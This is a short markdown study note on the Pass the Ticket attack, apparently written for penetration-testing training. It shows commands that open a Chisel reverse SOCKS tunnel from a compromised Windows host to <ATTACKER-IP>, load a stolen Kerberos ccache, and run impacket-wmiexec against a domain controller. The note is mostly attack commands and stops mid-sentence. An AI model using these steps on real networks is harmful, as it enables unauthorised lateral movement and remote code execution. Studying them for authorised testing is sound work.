---
tags:
  - PtT
---
# Pass the Ticket
To execute this attack, we need to proxy traffic via `MS01` with a tool such as [[File Transfer#Chisel|Chisel]] and #proxychains and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

```shell-session
$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

- On attack host:
```shell-session
$ sudo ./chisel server --reverse
```
- On Windows host:
```cmd-session
> chisel.exe client <ATTACKER-IP>:8080 R:socks
```
- Set the environment variable `KRB5CCNAME` with the path of targeted user's ccache file:
```shell-session
$ export KRB5CCNAME=/Path/to/krb5cc_file
```
- Finally, to use the Kerberos ticket, specify the target machine name (not IP!) and use `-k`. If prompted for a password, include `-no-pass`.
```shell-session
$ proxychains impacket-wmiexec dc01 -k
```

Once the Kerberos ticket (as `ccache`) is loaded and verified with [[klist]], we can perform